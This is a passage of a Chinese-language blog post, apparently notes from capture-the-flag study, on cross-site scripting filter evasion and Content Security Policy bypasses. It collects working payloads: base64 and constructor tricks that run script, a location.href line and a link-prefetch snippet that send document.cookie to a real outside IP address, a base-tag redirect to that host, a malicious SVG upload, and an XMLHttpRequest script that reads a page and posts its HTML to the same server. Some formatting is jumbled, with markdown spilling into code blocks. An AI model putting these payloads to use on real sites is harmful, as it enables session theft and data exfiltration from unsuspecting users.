    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h3 id="黑名单过滤-实体编码"><a href="#黑名单过滤-实体编码" class="headerlink" title="黑名单过滤+实体编码"></a>黑名单过滤+实体编码</h3><p>对于xss的防御最原始最基本的方式，使用正则过滤一些危险的字符串加上使用实体编码函数（比如PHP函数htmlspecialchars）</p><p><strong><em>编码方式</em></strong></p><ul><li><p>HTML编码:允许十进制和十六进制</p></li><li><p>URL编码</p></li><li><p>进制编码：三位八进制数“\074”，两位十六进制数”\x3c”，四位十六进制数“\u003c“</p></li><li><p>base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base64编码的利用</span><br><span class="line">涉及到的前提知识：atob函数，伪协议</span><br><span class="line">atob是js自带的base64解码函数</span><br><span class="line">例子</span><br><span class="line">&lt;script src&#x3D;&#39;data:text&#x2F;html;base64,YWxlcnQoMSk7&#39;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong><em>替换方式</em></strong></p><ul><li><p>常见符号替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write 可以写成 document[&#39;write&#39;]</span><br><span class="line">&#96;&#96;替代边界符</span><br></pre></td></tr></table></figure></li><li><p>危险函数替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  编码之后的字符串要配合这些函数才可以带到执行命令的目的</span><br><span class="line">  代码执行函数替换</span><br><span class="line">  eval（作用域为局部）</span><br><span class="line">  eval.call&#96;$&#123;&#39;js代码&#39;&#125;&#96;&#x2F;&#x2F;call可以跨对象调用</span><br><span class="line">  setTimeout&#96;js代码&#96;setTimeout(要执行的代码, 等待的毫秒数&#x2F;&#x2F;默认零)</span><br><span class="line">  new Function（作用域为全局）</span><br><span class="line">  [][&#39;constructor&#39;][&#39;constructor&#39;]</span><br><span class="line">  最后两个方式需要在js模板前加上一个字符，做为参数</span><br><span class="line">例如</span><br><span class="line">  [][&#39;constructor&#39;][&#39;constructor&#39;]&#96;a$&#123;alert(1)&#125;</span><br></pre></td></tr></table></figure><p>Function<code>a${atob</code>ZG9jdW1lbnQud3JpdGUoIjxzY3J%20pcHQgc3JjPScveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`}```//独孤九剑第8关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">![image-20200924105038657](https:&#x2F;&#x2F;my-blog-rookie.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;image-20200924105038657.png)</span><br><span class="line"></span><br><span class="line">## CSP</span><br><span class="line"></span><br><span class="line">内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。CSP是一种**白名单**策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。</span><br><span class="line"></span><br><span class="line">- ***location.href跳转***</span><br></pre></td></tr></table></figure><p>location.href 跳转就是一种跨域行为，所以它并不受csp的限制，但是跳转动静比较大，尽管如此这个在ctf中做简单的绕过csp也已经足够了<br>要求：能执行内联脚本<br>例子<br>&lt;scr//ipt&gt;location.href=”<a href="http://101.132.140.4:10000?&quot;+document.cookie" target="_blank" rel="noopener">http://101.132.140.4:10000?&quot;+document.cookie</a>&lt;/scr//ipt&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ***link标签预加载***</span><br></pre></td></tr></table></figure><p>在html5的特性中有关于预加页面资源预加载，他是浏览器提供的一个技巧，目的是让浏览器在空闲时间下载或预读取一些文档资源，用户在将来将会访问这些资源。一个Web页面可以对浏览器设置一系列的预加载指示，当浏览器加载完当前页面后，它会在后台静悄悄的加载指定的文档，并把它们存储在缓存里。当用户访问到这些预加载的文档后，浏览器能快速的从缓存里提取给用户。<br>这个link标签预加载的漏洞比较老旧了，其原因主要是老浏览器CSP对link标签的约束不够，在如今较新版的浏览器上就行不通了，在老浏览器上还可以用<br>payload<br>//动态生成需要有执行内联脚本的权力<br>var link = document.createElement(“link”);<br>link.setAttribute(“rel”, “prefetch”);//dns-prefetch<br>link.setAttribute(“href”, “//ip/?” + document.cookie);//domain<br>document.head.appendChild(link);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ***Iframe绕过***</span><br></pre></td></tr></table></figure><p>在一个同源站点有两个页面你，一个页面(A)有CSP保护，另一个页面(B)没有CSP保护且有xss注入点，那么就可以在B页面加入一各iframe用js操作A页面的数据。<br>payload<br>var iframe=document.creatElement(“iframe”);<br>iframe.setAttribute(“src”,”./A.php”);<br>document.body.appendChild(iframe);<br>setInterval(function(){alert(iframe.contentWindow…);},1000)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ***CSP设置中的漏网之鱼***</span><br></pre></td></tr></table></figure></li></ul><p>1.站点可控资源<br>2.站点可控jsonp<br>这些是开发人员在写CSP时对白名单信任域考虑不严格，信任可以被攻击者控制的站点，导致攻击者可以在可控站点上写js在被攻击的页面上任意执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[常见可控资源站点]: https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;csp-evaluator&#x2F;blob&#x2F;master&#x2F;whitelist_bypasses&#x2F;jsonp.js#L32-L180</span><br><span class="line"></span><br><span class="line">- ***script-src 使用 nonce***</span><br><span class="line"></span><br><span class="line">  1. base标签</span><br></pre></td></tr></table></figure><p>  这个标签可以指定上下文的引用连接默认的地址，如果有js引用使用的是相对路径，那么就可以用base标签将引用连接引导到攻击者的机器上<br>  要求：页面使用的scrip-src只有nonce，没有设置base-uri<br>  payload<br>  <base href="//101.132.140.4/"><br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  *例子*</span><br><span class="line"></span><br><span class="line">  ![image-20200924133917569](https:&#x2F;&#x2F;my-blog-rookie.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;image-20200924133917569.png)</span><br><span class="line"></span><br><span class="line">![image-20200924133930463](https:&#x2F;&#x2F;my-blog-rookie.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;image-20200924133930463.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;javascript</span><br><span class="line">2.js</span><br><span class="line">alert(&quot;test&quot;);</span><br></pre></td></tr></table></figure></p><ol start="2"><li><p>使用不完整的script标签绕过(针对nonoce)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种情况适用于注入点与网页自带的有nonoce的script脚本距离较近，之间没有什么特殊符号，那么就可以使用不完整的script标签把，把nonce属性值给吃掉</span><br><span class="line">ps:这方法对chrome无用</span><br></pre></td></tr></table></figure><p><em>例子</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;data:text&#x2F;plain,alert(1)&quot;&#x2F;&#x2F;payload</span><br><span class="line">&lt;script nonce&#x3D;&quot;tttt&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20200924182819224.png" alt="image-20200924182819224"></p></li></ol><ul><li><p>搭配文件上传漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">由于svg能够执行javascript脚本，如果存在上传功能并且能够上传svg文件那么就可以通过上床恶意svg，来xss</span><br><span class="line">payload</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span>   <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CRLF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个原理很简单，有可控点在在csp之上，就可以通过回车换行将CSP注入到HTTP返回体中，就使CSP失效了。</span><br></pre></td></tr></table></figure><h2 id="XSS还能做什么"><a href="#XSS还能做什么" class="headerlink" title="XSS还能做什么"></a>XSS还能做什么</h2><p>httponly是一项关于cookie的设置，如果某个cookie开启这个设置，那么js将无法调用该cookie</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20200924192039162.png" alt="image-20200924192039162"></p></li></ul><p>那么除了操作cookie xss还有什么作用？</p><h3 id="XMLHttpRequest对象"><a href="#XMLHttpRequest对象" class="headerlink" title="XMLHttpRequest对象"></a>XMLHttpRequest对象</h3><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20200925103930818.png" alt="image-20200925103930818"></p><p>这个对象可以让js代码具有发送请求的能力，甚至不限于http协议，那么我们能用它做什么呢？</p><h3 id="先看看XMLHttpRequest的相关函数与属性"><a href="#先看看XMLHttpRequest的相关函数与属性" class="headerlink" title="先看看XMLHttpRequest的相关函数与属性"></a>先看看XMLHttpRequest的相关函数与属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">XMLHttpRequest()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">GET型</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"GET"</span>,<span class="string">"http://101.132.140.4/"</span>,<span class="literal">true</span>)<span class="comment">//三个参数分别对应请求方法，url，是否采用异步</span></span><br><span class="line">xhr.send()<span class="comment">//发送HTTP请求，括号内是请求主体</span></span><br><span class="line">POST型(带数据的，以上传文件为例)</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>,<span class="string">"/upload"</span>,<span class="literal">true</span>)</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"multipart/form-data; boundary=---------------------------12264101169922"</span>);<span class="comment">//用于设置请求头</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">"-----------------------------12264101169922\r\n"</span> + </span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"file\"; filename=\"shell\"\r\n"</span> + </span><br><span class="line"><span class="string">"Content-Type: text/plain\r\n"</span> + </span><br><span class="line"><span class="string">"\r\n"</span> + </span><br><span class="line"><span class="string">"shell\r\n"</span> + </span><br><span class="line"><span class="string">"-----------------------------12264101169922\r\n"</span> + </span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"submit\"\r\n"</span> + </span><br><span class="line"><span class="string">"\r\n"</span> + </span><br><span class="line"><span class="string">"\xcc\xe1\xbd\xbb\xb2\xe9\xd1\xaf\r\n"</span> + </span><br><span class="line"><span class="string">"-----------------------------12264101169922--\r\n"</span>;<span class="comment">//明文主体</span></span><br><span class="line"><span class="keyword">var</span> abody = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(body.length)<span class="comment">//创建一个有主体长度的数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBody.length; i++)</span><br><span class="line">    aBody[i] = body.charCodeAt(i);<span class="comment">//逐位编码主体</span></span><br><span class="line">xhr.send(<span class="keyword">new</span> Blob([aBody]));<span class="comment">//获得有着主体数据Blob对象，并完成请求，之后就可以将报文利用response属性发送给vps</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXmlHttp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">var</span> MSXML = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">'MSXML2.XMLHTTP.5.0'</span>, <span class="string">'MSXML2.XMLHTTP.4.0'</span>, <span class="string">'MSXML2.XMLHTTP.3.0'</span>, <span class="string">'MSXML2.XMLHTTP'</span>, <span class="string">'Microsoft.XMLHTTP'</span>);</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  xmlHttp = <span class="keyword">new</span> ActiveXObject(MSXML[n]);</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">             &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> createXmlHttp();</span><br><span class="line"> xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=<span class="built_in">escape</span>(xmlHttp.responseText);</span><br><span class="line">         createXmlHttp();</span><br><span class="line">         url = <span class="string">"http://101.132.140.4:10000"</span>;   </span><br><span class="line">         cc = <span class="string">"htmlcode="</span> + code +<span class="string">"&amp;filename=index.html"</span>;</span><br><span class="line">         xmlHttp.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">         xmlHttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">         xmlHttp.send(cc)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;;</span><br><span class="line">xmlHttp.open(<span class="string">"GET"</span>, <span class="string">"./test.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlHttp.send(<span class="literal">null</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
